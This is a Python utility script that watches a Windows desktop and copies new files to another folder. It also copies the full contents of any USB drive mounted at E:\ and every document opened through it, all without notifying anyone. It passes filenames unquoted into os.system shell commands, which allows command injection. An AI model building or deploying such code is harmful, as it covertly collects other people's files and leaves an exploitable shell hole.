#Copyright Bail 2022
#deskcopy 桌面拖入文件自动复制 v1.0_1
#2022.11.18-2022.12.10

TARGET = 'D:\\desktop'

import os,time,shutil,sys,threading

os.chdir(os.path.join(os.path.expanduser('~'),'Desktop'))
filenum = len(os.listdir())

def execute_with_arg():
    if len(sys.argv) == 2:
        if sys.argv[1] == '--upan':
            upan()
            sys.exit()
        else:
            openfile(sys.argv[1])

            sys.exit()
def is_file_number_change():
    '''检测是否出现新文件
返回值:当前（改变后的）文件列表(list)
    技术细节：获取桌面文件列表，统计文件数量，和原来的数量对比。
            若增多，说明有新文件，则退出阻塞，进行下一步操作。'''
    global filenum
    nowfilenum = len(os.listdir())
    if nowfilenum != filenum:
        filenum = nowfilenum    #复制结束后更新“原文件数量”
        return True
    else:
        return False
"""
def get_new_file_name_list(new:list):
    '''获取新增文件的文件名的列表
new(list):当前（改变后的）文件列表
返回值:新增文件名列表(list)'''
    #技术细节：新旧文件列表取补集（使用列表推导式）
    old = filelst   #旧的（改变前的）文件列表
    result = [i for i in new if i not in old]
    return result
def copy_new_file(fnlst:list):
    '''将新文件进行复制
fnlst(list):要进行复制的（新增的）文件列表'''
    for i in fnlst:
        shutil.copyfile(i,TARGET)
def main():
    
    root.after(1000,main)
"""
def upan(): #※不可在Linux下测试
    global TARGET
    while not os.path.exists('E:\\'):
        time.sleep(60)
    os.chdir('E:\\')
    TARGET = os.path.join(TARGET,time.strftime('%Y%m%d%H%M%S'))
    os.mkdir(TARGET)
    copy('.',TARGET)
def openfile(filename:str):
    '''打开文件并复制
filename(str):文件名
'''
    file_suffix = os.path.splitext(filename)[-1][1:]
    if file_suffix in ('doc','docx'):
        threading.Thread(target=lambda:os.system(f'start winword {filename}')).start()
        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
        sys.exit()
    elif file_suffix in ('ppt','pptx'):
        threading.Thread(target=lambda:os.system(f'start powerpnt {filename}')).start()
        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
        sys.exit()
    elif file_suffix in ('xls','xlsx'):
        threading.Thread(target=lambda:os.system(f'start excel {filename}')).start()
        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
        sys.exit()
    elif file_suffix in ('pdf',):
        threading.Thread(target=lambda:os.system(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
def copy(path:str,target:str):
    '''复制目录下所有文件
path(str):目录路径
target(str):目标路径'''
    filelst = os.walk(path)
    for i in filelst:
        for j in i[2]:
            filesrc = os.path.join(i[0],j)
            if '.lnk' not in filesrc:    #排除.lnk文件
                filetarget = os.path.join(target,j)
                try:
                    shutil.copy(filesrc,filetarget)
                except Exception as e:
                    print(f'复制异常 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
                    print(e)
                else:
                    print(f'已复制 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')

def main():
    execute_with_arg()
    print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
    while True:
        if is_file_number_change():
            copy('.',TARGET)
        time.sleep(5)

if __name__ == '__main__':
    main()
